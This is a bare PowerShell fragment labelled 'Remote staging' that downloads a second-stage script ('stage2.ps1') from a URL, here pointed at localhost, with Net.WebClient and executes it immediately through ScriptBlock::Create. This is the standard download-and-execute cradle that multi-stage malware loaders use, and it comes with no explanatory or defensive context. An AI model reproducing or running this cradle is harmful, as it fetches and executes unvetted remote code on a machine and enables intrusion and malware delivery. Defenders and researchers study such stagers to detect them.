# Remote staging
$Stage2Url = "http://127.0.0.1/stage2.ps1"
$StageScript = (New-Object Net.WebClient).DownloadString($Stage2Url)
& ([ScriptBlock]::Create($StageScript))
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
